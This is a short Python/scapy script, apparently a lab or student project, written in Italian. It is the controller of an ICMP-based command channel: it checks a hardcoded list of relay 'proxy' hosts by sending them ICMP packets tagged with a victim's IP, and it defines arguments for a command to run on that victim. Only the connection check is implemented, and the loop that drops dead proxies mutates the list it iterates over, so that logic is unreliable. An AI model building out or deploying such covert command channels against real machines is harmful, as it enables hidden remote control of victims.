from scapy.all import * #ICMP, IP, Raw, sniff
import string
import argparse
import mymethods 

parser = argparse.ArgumentParser()
parser.add_argument("--ip_vittima",type=str, help="IP della vittima")
#parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")

proxyIP = [
    "192.168.56.101"
    ,"192.168.56.103"
    #,"192.168.56.1"
    #,"192.168.56.xxx"
] 

ip_vittima=None

def check_connection(ip):
    if ip_vittima is None:
        raise Exception("IP della vittima sconosciuto")
    print(f"Connessione con {ip}...")
    pkt = IP(dst=ip)/ICMP() / "".join( "__CONNECT__ {}".format(ip_vittima))
    ans = sr1(pkt, timeout=2, verbose=1)
    if ans:
        print(f"{ip} is alive")
        #ans.show()
        return True
    else:
        print(f"{ip} is not responding NO REPLY") 
        return False

if __name__=="__main__":
    print(type(str))
    print("----")
    mymethods.add_argument(["--comando",str, "Comando da eseguire"],parser)
    mymethods.add_argument(["--numero", int, "Comando numerico da testare"],parser)
    args=mymethods.check_args(parser)
    if args.ip_vittima is None:
        print("Devi specificare l'IP della vittima con --ip_vittima")
        mymethods.supported_arguments(parser)
        exit(1) 
    ip_vittima=args.ip_vittima
    for proxy in proxyIP:
        print(f"Prova IP proxy {proxy}")
        proxyIP.remove(proxy) if not check_connection(proxy) else None
    if len(proxyIP)<1:
        print("Nessun proxy presente. Prova a mettere questa macchina")
        exit(1) 